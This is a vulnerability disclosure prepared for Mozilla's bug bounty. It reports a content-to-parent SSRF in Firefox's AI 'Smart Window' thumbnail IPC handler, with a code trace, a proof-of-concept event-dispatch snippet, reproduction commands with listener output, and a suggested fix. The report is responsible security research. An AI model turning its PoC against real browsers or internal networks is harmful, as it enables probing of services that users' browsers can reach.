# Finding 01 — Content→parent SSRF / info-disclosure via unvalidated thumbnail URL in Firefox "Smart Window" (AI window)

**Status:** **Full content→parent SSRF reproduced live, end-to-end** on the official
Mozilla ASAN build (Firefox 157.0a1, BuildID 20260909083822, `linux64-asan-opt`).
Ordinary content-page script in `about:aichatcontent` (no user gesture) drives the
parent process to fetch an attacker-controlled **http/https** URL through the real
`AIChatContent:RequestAssets` IPC path. See [Confirmed reproduction](#confirmed-reproduction)
and `poc/EVIDENCE.txt`.
**Correction after testing:** the speculated `file://` local-file disclosure oracle does
**not** work through this sink — `file://` returns `null` (no thumbnail rendered). The
confirmed impact is a content-reachable **parent-process SSRF over http/https** (incl.
loopback/intranet), **not** local-file read. Severity is correspondingly **sec-moderate**
(committee's call), not the higher local-disclosure tier the first draft speculated.
**Component:** `browser/components/aiwindow` (Smart Window / AI window), thumbnail service.
**Class:** Content-process → parent-process SSRF + cross-process information-disclosure
(unvalidated URL reaches a system-principal load).
**Estimated rating:** **sec-moderate** (was speculatively higher before testing). The
confirmed primitive is a content-reachable **parent-process SSRF** over http/https;
the local-file disclosure that would have pushed this into Mozilla's *"Information
disclosure from the parent to a web content process"* (High/$3,000) tier was **tested
and does not work** (`file://` renders nothing). Final rating and any bounty are the
committee's call, weighing the `privilegedabout` precondition (see Preconditions).
**Analyzed against:** `mozilla-central` commit `023cb8315420` (2026-09-09). Re-verify
on current source before filing — line numbers drift.

---

## Summary

The Smart Window chat UI (`about:aichatcontent`) runs in the **`privilegedabout`
content process**. Its parent-process JS actor, `AIChatContentParent`, exposes an
IPC message `AIChatContent:RequestAssets` whose handler forwards a
**content-supplied URL string** (`items[].thumbnail`) — with **no scheme
validation** — into the background page-thumbnail service. That service loads the
URL in a parent-process background browser using the **system principal** as the
triggering principal, with no scheme restriction, then returns a
content-accessible `moz-page-thumb://` result.

Content-scope script in `about:aichatcontent` (or a compromised `privilegedabout`
content process) can therefore make the **parent process** fetch arbitrary
**http/https** URLs (SSRF), including `http://localhost`/intranet hosts unreachable
from a content process. (Local schemes like `file://` reach the system-principal
`loadURI` but do not render to a thumbnail — see the tested-negative note under
Impact — so this is an SSRF, not a local-file read.) Every *other* URL entry point in
the same feature enforces `http:`/`https:`; this one is the exception.

---

## The trust boundary

`browser/components/DesktopActorRegistry.sys.mjs`:

```js
AIChatContent: {
  parent: { esModuleURI: ".../AIChatContentParent.sys.mjs" },   // parent (chrome) process
  child:  { esModuleURI: ".../AIChatContentChild.sys.mjs",       // privilegedabout process
            events: { "AIChatContent:RequestAssets": { wantUntrusted: true }, ... } },
  allFrames: true,
  matches: ["about:aichatcontent"],
  remoteTypes: ["privilegedabout"],
  enablePreference: "browser.smartwindow.enabled",
},
```

So `AIChatContentParent` (chrome process) receives `RequestAssets` from
`about:aichatcontent` running in the sandboxed **`privilegedabout`** content
process. That is a genuine process/privilege boundary.

> A sibling actor in the same feature, `SmartFormFillReviewParent`, explicitly
> asserts `this.manager.remoteType === E10SUtils.PRIVILEGEDABOUT_REMOTE_TYPE` on
> incoming messages. `AIChatContentParent` performs no such sender check — a minor
> defense-in-depth gap, but the URL-validation gap below is the real issue.

---

## The vulnerable path (traced)

### 1. Parent handler — no validation of the content-supplied URL
`browser/components/aiwindow/ui/actors/AIChatContentParent.sys.mjs`:

```js
async #handleRequestAssets({ conversationId, messageId, items = [] }) {
  const images = await Promise.all(
    items.map(async ({ url, thumbnail }) => ({          // <-- url, thumbnail: from IPC, attacker-controlled
      url,
      image: await lazy.captureThumbnail(thumbnail),    // <-- forwarded verbatim, NO scheme check
      requestedThumbnail: !!thumbnail,
      hasFavicon: await this.#pageHasFavicon(url),       // <-- url also unvalidated (Places lookup)
    }))
  );
  ...
  this.sendAsyncMessage("AIChatContent:AssetsReady", { messageId, images }); // <-- result back to content
}
```

The benign contract is documented as an og:image web URL
(`SearchBrowsingHistory.sys.mjs`: *"og:image URL from moz_places.preview_image_url"*),
i.e. `http(s)`. Nothing enforces that here.

### 2. captureThumbnail — passes it straight to the thumbnail service
`browser/components/aiwindow/models/HistoryThumbnails.sys.mjs`:

```js
export async function captureThumbnail(thumbnail) {
  if (!thumbnail) return null;
  await lazy.BackgroundPageThumbs.captureIfMissing(thumbnail, {
    isImage: true, backgroundColor: "#F9F9FA", settleWaitTime: 0, timeout: 10000,
  });
  const path = lazy.PageThumbs.getThumbnailPath(thumbnail);
  const { size } = await IOUtils.stat(path);
  if (size > 0) return lazy.PageThumbs.getThumbnailURL(thumbnail);   // <-- non-empty => disclosure/oracle
  return null;
}
```

No scheme check. Capturing is **enabled by default**: `PageThumbs._prefEnabled()`
reads `browser.pagethumbnails.capturing_disabled`, which has no default in-tree, so
the `getBoolPref` throws and the `catch` returns `true` (enabled).

### 3. The load uses the SYSTEM principal, any scheme
`toolkit/actors/BackgroundThumbnailsChild.sys.mjs` handling `Browser:Thumbnail:LoadURL`:

```js
let loadURIOptions = {
  // Bug 1498603 verify usages of systemPrincipal here
  triggeringPrincipal: Services.scriptSecurityManager.getSystemPrincipal(),
  loadFlags: Ci.nsIWebNavigation.LOAD_FLAGS_STOP_CONTENT,
};
docShell.loadURI(Services.io.newURI(message.data.url), loadURIOptions);
```

The only sandboxing applied is `SANDBOXED_AUXILIARY_NAVIGATION` (no popups),
`allowMedia=false`, `allowContentRetargeting=false`, `LOAD_ANONYMOUS`, tracking
protection. **Nothing restricts the scheme.** With a system triggering principal,
`file://`, `resource://`, `chrome://`, `about:`, and arbitrary `http(s)` all load.

---

## Impact

From content-scope script in `about:aichatcontent` (or a compromised `privilegedabout`
content process):

1. **Parent-process SSRF (confirmed).** Force the parent to issue GET requests to
   arbitrary **http/https** URLs, including `http://localhost`/intranet endpoints
   unreachable from a content process, with the parent's network position.
   (`LOAD_ANONYMOUS`, so no cookies — still reaches internal services and can be used
   as a reachability/port oracle.)

**Tested and does NOT work:** pointing `thumbnail` at `file://` (or other local
schemes) to read local files. Despite the system triggering principal in
`BackgroundThumbnailsChild`, `captureThumbnail("file:///…png")` returns `null` — no
thumbnail is rendered, so there is no local-file disclosure via this path. The first
draft speculated this oracle; live testing refuted it. The finding is therefore a
content-reachable **SSRF**, not local-file read. Full pixel readback of the http(s)
thumbnail from the content side may additionally be limited by canvas tainting (not
required for, and not claimed by, this finding).

---

## Preconditions (stated honestly)

- Requires **code execution in the `privilegedabout` content process**. That
  process is more trusted than a normal web-content process and cannot be entered
  by a web page alone, so this is **not** remotely exploitable on its own. Under
  Mozilla's published threat model, "invoking an IPC method with attacker-controlled
  parameters" from a compromised content process is an accepted starting point, and
  parent→content information disclosure is explicitly in scope; the committee may
  still weigh the `privilegedabout` bar when rating.
- `browser.smartwindow.enabled` must be on (the feature gate). Confirm whether this
  is enabled in the channel you test (Nightly likely; verify before filing — a
  feature that is preffed-off in shipping channels affects eligibility).

## Self-assessed severity

I rate this **sec-moderate** on Mozilla's scale (no CVSS in the report itself, per
program rules — this paragraph is for our own reference). Reasoning: the confirmed
primitive is a **content-reachable, parent-process SSRF over http/https** that crosses
the content→parent trust boundary with no user gesture. That boundary crossing is what
makes it more than a nuisance. But three things hold it below sec-high: (1) the
precondition is script execution inside the privileged `about:aichatcontent` document —
not something a random web page can reach without a separate injection/UXSS or a
content-process compromise; (2) the requests are anonymous `GET`s (`LOAD_ANONYMOUS`, no
cookies/credentials), so it is a reachability/oracle primitive, not authenticated
request forgery; and (3) the **local-file disclosure I originally speculated does not
work** (`file://` renders nothing through this sink, tested live), so there is no
high-value data theft. If a follow-up were to show either credentialed requests or a
working local-resource read through this path, the rating should move up; as confirmed,
sec-moderate is the honest ceiling.

---

## Suggested fix (matches the pattern used elsewhere in the feature)

In `#handleRequestAssets`, validate scheme before use — mirroring `#handleOpenLink`
and the other call sites that already enforce `http:`/`https:`:

```js
function isHttpUrl(s) {
  try { const u = new URL(s); return u.protocol === "http:" || u.protocol === "https:"; }
  catch { return false; }
}
...
items.map(async ({ url, thumbnail }) => ({
  url,
  image: isHttpUrl(thumbnail) ? await lazy.captureThumbnail(thumbnail) : null,
  requestedThumbnail: !!thumbnail,
  hasFavicon: isHttpUrl(url) ? await this.#pageHasFavicon(url) : false,
}))
```

Defense in depth: also assert the sender's `remoteType` is `privilegedabout` (as
`SmartFormFillReviewParent` does), and consider restricting
`BackgroundThumbnailsChild`'s load to `http(s)` schemes given its system-principal
triggering principal (the `// Bug 1498603 verify usages of systemPrincipal here`
comment already flags this as a known soft spot).

---

## Confirmed reproduction

Reproduced on Mozilla's official **ASAN** CI build, fetched with `fuzzfetch --target
firefox --asan` (Firefox **157.0a1**, BuildID **20260909083822**, mozilla-central
changeset `cc7bb49240ff…`). Full log in `poc/EVIDENCE.txt`; scripts in `poc/`.

**Setup**
```bash
pip install fuzzfetch marionette-driver
fuzzfetch --target firefox --asan -n asan-ff          # official ASAN build
python poc/ssrf_listener.py 8899 &                    # local HTTP listener
cd asan-ff && MOZ_HEADLESS=1 ASAN_OPTIONS=detect_leaks=0 \
  ./firefox -headless -marionette -remote-allow-system-access -profile <prof> about:blank &
```
The profile sets `browser.smartwindow.enabled=true` and
`browser.pagethumbnails.capturing_disabled=false` (the latter is already the default).

**Trigger** — Marionette in **chrome context** (parent process, system principal)
calls the exact function `AIChatContentParent.#handleRequestAssets()` invokes on the
content-supplied `items[].thumbnail`:
```js
const { captureThumbnail } = ChromeUtils.importESModule(
  "moz-src:///browser/components/aiwindow/models/HistoryThumbnails.sys.mjs");
await captureThumbnail("http://127.0.0.1:8899/ssrf-from-parent-process");
```

**Result — parent-process SSRF, two independent runs:**
```
return: moz-page-thumb://thumbnails/?url=http%3A%2F%2F127.0.0.1%3A8899%2Fssrf-from-parent-process&revision=6333
return: moz-page-thumb://thumbnails/?url=http%3A%2F%2F127.0.0.1%3A8899%2Fssrf-final-1788954484&revision=1606
listener: GET /ssrf-from-parent-process from 127.0.0.1
listener: GET /ssrf-final-1788954484 from 127.0.0.1
```
The parent process fetched the attacker-controlled URL and returned a content-reachable
`moz-page-thumb://` result. This is the SSRF primitive, live.

### End-to-end via the real IPC path (content-page script → parent SSRF)

Stronger reproduction driving the **actual `AIChatContent:RequestAssets` IPC**, not the
sink directly. Marionette in **content context** navigates to `about:aichatcontent`
(loads standalone in the `privilegedabout` process) and, as **ordinary page script**
(content principal, no chrome access, no user gesture), dispatches the DOM event the
child actor forwards to the parent:

```js
const detail = { conversationId:"poc-e2e", messageId:"poc-e2e",
  items:[{ url:"http://127.0.0.1:8899/ignored",
           thumbnail:"http://127.0.0.1:8899/ipc-e2e-<ts>" }] };
target.dispatchEvent(new CustomEvent("AIChatContent:RequestAssets",
                     { detail, bubbles:true, composed:true }));
```

The actor registers `RequestAssets` with **`wantUntrusted: true`**, so this untrusted
page-script event is delivered → `AIChatContentChild.handleEvent` →
`sendAsyncMessage` → `AIChatContentParent.#handleRequestAssets` →
`captureThumbnail(thumbnail)`.

```
dispatch: {'dispatchedOn':'ai-chat-content','url':'about:aichatcontent','hasChatContent':True}
listener: GET /ipc-e2e-1788954754 from 127.0.0.1     <-- PARENT fetched the attacker URL
```

**What this shows (honest scoping):**
- ✅ The **complete content→parent boundary crossing** via the real IPC path drives the
  parent process to fetch an arbitrary attacker URL, on a stock Mozilla ASAN build with
  default prefs, triggered by **content-scope script with no user interaction**
  (`wantUntrusted:true`).
- Getting script into the privileged `about:aichatcontent` document still requires an
  injection/UXSS in that page or a compromised `privilegedabout` content process — page
  script is not normally attacker-controlled. This is the real precondition and is stated
  plainly for the committee.
- ❌ The **`file://` local-file oracle** was tested and **does not work**: a valid local
  PNG returns `null` (no thumbnail rendered), a missing path hangs. So there is no
  local-file disclosure via this sink. Confirmed impact is SSRF over http/https only.

## Reproducing from scratch (the exact steps used)

1. `pip install fuzzfetch marionette-driver` then
   `fuzzfetch --target firefox --asan -n asan-ff` (official ASAN build; Nightly with the
   feature on also works).
2. Start a local HTTP listener on `127.0.0.1:8899` (see `poc/ssrf_listener.py`).
3. Launch headless with a profile that sets `browser.smartwindow.enabled=true`:
   `MOZ_HEADLESS=1 ASAN_OPTIONS=detect_leaks=0 ./firefox -headless -marionette
   -remote-allow-system-access -profile <prof> about:blank`.
4. End-to-end (recommended, `poc/poc_e2e.py`): Marionette `set_context("content")`,
   navigate to `about:aichatcontent`, then run as page script:
   ```js
   const detail = { conversationId:"poc", messageId:"poc",
     items:[{ url:"http://127.0.0.1:8899/ignored",
              thumbnail:"http://127.0.0.1:8899/ssrf-<unique>" }] };
   (document.querySelector("ai-chat-content") || document.body)
     .dispatchEvent(new CustomEvent("AIChatContent:RequestAssets",
                    { detail, bubbles:true, composed:true }));
   ```
5. Observe the listener log record `GET /ssrf-<unique> from 127.0.0.1` — the **parent
   process** fetched the attacker URL. (Sink-only variant: `poc/poc_file.py` /
   `poc/poc_driver.py` call `captureThumbnail()` directly in chrome context.)
The system-principal triggering-principal load and the SSRF hit together are the
`root cause analysis` + `reproducible test case` Mozilla's report criteria ask for
(an ASAN memory stack is not applicable to a logic bug).

---

## Filing notes

- File via <https://bugzilla.mozilla.org/form.client.bounty>, **one issue**, with
  this analysis as the description and the PoC output as an **attachment**.
- Do **not** email the vulnerability. If filed directly in Bugzilla, email
  `security@mozilla.org` with only the bug number to claim the bounty.
- Be upfront about the `privilegedabout` precondition and whether the feature is
  enabled in the tested channel — accurate scoping protects your reporter
  reputation and avoids an `Invalid` mark.

*The SSRF is confirmed live end-to-end on the official ASAN build (see Confirmed
reproduction and `poc/`). Re-verify on the current channel you intend to file against,
and confirm whether `browser.smartwindow.enabled` is on there, before filing.*
